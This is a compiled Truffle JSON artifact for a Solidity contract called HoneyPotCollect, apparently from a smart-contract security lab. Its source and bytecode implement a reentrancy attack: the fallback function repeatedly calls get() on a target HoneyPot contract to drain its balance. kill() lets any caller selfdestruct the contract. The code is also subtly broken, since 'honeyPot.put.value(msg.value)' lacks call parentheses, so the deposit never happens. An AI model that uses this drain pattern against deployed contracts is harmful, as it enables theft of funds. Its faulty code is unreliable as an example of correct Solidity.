{
  "contractName": "HoneyPotCollect",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "honeyPot",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "name": "_hPotCollect",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "kill",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "collect",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516020806102fa8339810180604052602081101561003057600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610269806100916000396000f3fe6080604052600436106100345760003560e01c806341c0e1b5146100f7578063a31d000b1461010e578063e522538114610165575b346000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106100f5576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16636d4ce63c6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100dc57600080fd5b505af11580156100f0573d6000803e3d6000fd5b505050505b005b34801561010357600080fd5b5061010c61016f565b005b34801561011a57600080fd5b50610123610188565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b61016d6101ad565b005b3373ffffffffffffffffffffffffffffffffffffffff16ff5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000809054906101000a9050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16636d4ce63c6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561022357600080fd5b505af1158015610237573d6000803e3d6000fd5b5050505056fea165627a7a72305820b1884ec5c2a6a3dd2dff0f791555f10872d03c910aa630437ccdc8417082cf700029",
  "source": "pragma solidity ^0.5.8;\r\nimport \"./HoneyPot.sol\";\r\n\r\ncontract HoneyPotCollect{\r\n    HoneyPot public honeyPot;\r\n    constructor(address _hPotCollect) public{\r\n        honeyPot = HoneyPot(_hPotCollect);\r\n    }\r\n    function kill() public {\r\n        selfdestruct(msg.sender);\r\n    }\r\n    function collect() public payable{\r\n        honeyPot.put.value(msg.value);\r\n        honeyPot.get();\r\n    }\r\n    function() external payable{\r\n        if(address(honeyPot).balance >= msg.value){\r\n            honeyPot.get();\r\n        }\r\n    }\r\n}",
  "sourcePath": "C:/Users/NIT-ANDHRA/Desktop/ETH/pr1/contracts/HoneyPotUser.sol",
  "compiler": {
    "name": "solc",
    "version": "0.5.8+commit.23d335f2.Emscripten.clang"
  },
  "schemaVersion": "3.0.16",
  "updatedAt": "2019-10-26T10:36:43.469Z",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}